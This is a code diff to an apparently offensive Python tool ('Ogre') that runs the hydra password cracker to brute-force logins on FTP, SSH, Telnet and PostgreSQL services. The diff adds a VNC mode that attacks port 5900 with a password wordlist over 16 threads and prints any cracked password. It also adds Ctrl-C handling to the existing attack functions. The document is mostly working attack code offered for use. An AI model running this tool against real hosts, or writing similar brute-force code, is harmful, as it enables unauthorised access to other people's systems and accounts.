@@ -28,6 +28,8 @@ def inputHandler():
         telnet()
     elif inputHeader == "4":
         postgresql()
+    elif inputHeader == "5":
+        vnc()
     else:
         print (Red + "[!] Wrong Choice: '" + Yellow + inputHeader + Red + "'")
         inputHandler()
@@ -98,6 +100,22 @@ def postgresql():
         print(traceback.format_exc())
         print("\n" + NC)
         exit()
+
+def vnc():
+    try:
+        host = input(Cyan + "[+] Enter Host IP: " + White)
+        wordlist = input(Cyan + "[+] Enter path to Password wordlist(e.g. "+ Yellow + "'" + Cyan + "wordlist/sshpass.txt"+Yellow+"'" + Cyan + "): " + White)
+        print("\n")
+        vncConnect(host, wordlist)
+    except KeyboardInterrupt:
+        print(Green + "\n" + "[~] Shutting down..." + NC)
+        raise SystemExit
+    except Exception as e:
+        print(RED + "\n" + "[!] Ogre crashed..." + "\n" + "[!] Debug info: " + "\n")
+        print(traceback.format_exc())
+        print("\n" + NC)
+        exit()
+
 def sshConnect(host, username, wordlist):
     try:
         print(Green + "[+] Bruteforcing ssh... " + LWhite
@@ -112,6 +130,9 @@ def sshConnect(host, username, wordlist):
             if 'host' in line.decode('utf-8'):
                 print("\n" + LGreen + "[+] Cracked Password:" +
                       line.decode('utf-8') + LWhite)
+    except KeyboardInterrupt:
+        print(Green + "\n" + "[~] Shutting down..." + NC)
+        raise SystemExit
     except Exception as exc:
         print("[!] Error : %s " % exc)
 
@@ -128,6 +149,9 @@ def ftpConnect(host, username, wordlist):
             if 'host' in line.decode('utf-8'):
                 print("\n" + LGreen + "[+] Cracked Password:" +
                 line.decode('utf-8') + LWhite)
+    except KeyboardInterrupt:
+        print(Green + "\n" + "[~] Shutting down..." + NC)
+        raise SystemExit
     except Exception as exc:
         print("[!] Error : %s " % exc)
 
@@ -144,6 +168,9 @@ def telnetConnect(host, username, wordlist):
             if 'host' in line.decode('utf-8'):
                 print("\n" + LGreen + "[+] Cracked Password:" +
                 line.decode('utf-8') + LWhite)
+    except KeyboardInterrupt:
+        print(Green + "\n" + "[~] Shutting down..." + NC)
+        raise SystemExit
     except Exception as exc:
         print("[!] Error : %s " % exc)
 
@@ -160,8 +187,31 @@ def postgresqlConnect(host, username, wordlist):
             if 'host' in line.decode('utf-8'):
                 print("\n" + LGreen + "[+] Cracked Password:" +
                 line.decode('utf-8') + LWhite)
+    except KeyboardInterrupt:
+        print(Green + "\n" + "[~] Shutting down..." + NC)
+        raise SystemExit
     except Exception as exc:
         print("[!] Error : %s " % exc)
+
+def vncConnect(host, wordlist):
+    try:
+        print(Green + "[+] BruteForcing VNC..." + LWhite)
+        p1 = subprocess.Popen(['hydra', '-s' , '5900', '-P', wordlist, host,
+                                     'vnc', '-t', '16'], stdout=PIPE,
+                                    stderr=PIPE)
+        for line in iter(p1.stdout.readline, b''):
+            print(line.decode('utf-8').strip('\n'))
+            sys.stdout.flush()
+            time.sleep(0.0001)
+            if 'host' in line.decode('utf-8'):
+                print("\n" + LGreen + "[+] Cracked Password:" +
+                line.decode('utf-8') + LWhite)
+    except KeyboardInterrupt:
+        print(Green + "\n" + "[~] Shutting down..." + NC)
+        raise SystemExit
+    except Exception as exc:
+        print("[!] Error : %s " % exc)
+
 
 os.system('clear||cls')
 header = """
@@ -182,5 +232,6 @@ print(Yellow + "[1] FTP" + NC)
 print(Yellow + "[2] SSH" + NC)
 print(Yellow + "[3] Telnet" + NC)
 print(Yellow + "[4] Postgresql" + NC)
+print(Yellow + "[5] VNC" + NC)
 inputHandler()
 
